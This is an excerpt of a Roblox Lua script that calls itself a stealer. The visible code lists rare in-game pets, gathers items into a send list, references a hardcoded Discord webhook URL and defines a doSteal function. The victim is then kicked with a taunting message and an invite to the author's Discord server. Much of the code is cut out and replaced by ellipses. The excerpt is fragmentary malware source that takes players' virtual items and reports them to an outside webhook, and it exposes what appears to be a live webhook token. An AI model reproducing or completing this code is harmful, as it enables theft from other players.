...
local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "T-Rex", "Kitsune", "Disco Bee", "Queen Bee", "Spinosaurus", "Seedling", "Griffin"}
local totalValue = 0
local itemsToSend = {}

if next(Dagut23) == nil or webhook == "https://discord.com/api/webhooks/1379937868906234028/ZmYj3liDqj3f4dsTLj7b22WPAUA_TixQ4lSx_-_W7hs1ZOwSLb1wEkkZfedw2KAzJEpc" then
...
if #itemsToSend > 0 then
    ...
    local function doSteal(player)
        ...
        plr:kick("All your stuff just got stolen by Zacari's stealer!\n Join discord.gg/GY2RVSEGDT")
    end
